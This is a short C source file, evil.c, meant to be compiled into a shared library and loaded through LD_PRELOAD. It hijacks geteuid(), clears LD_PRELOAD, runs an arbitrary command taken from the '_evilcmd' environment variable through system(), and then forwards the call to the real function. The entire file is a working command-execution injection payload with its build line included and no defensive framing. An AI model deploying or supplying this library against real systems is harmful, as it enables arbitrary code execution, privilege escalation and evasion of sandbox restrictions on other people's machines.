#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// gcc -shared -fPIC  evil.c -o evil.so -ldl

typedef int (*orig_geteuid_f_type)(void);

int geteuid(void)
{
    // Prevent the evil.so from being called recursively
    unsetenv("LD_PRELOAD");

    // Run evil command
    system(getenv("_evilcmd"));

    // Get original geteuid function()
    orig_geteuid_f_type orig_geteuid = (orig_geteuid_f_type)dlsym(RTLD_NEXT,"geteuid");

    // Call original function
    return orig_geteuid();
}
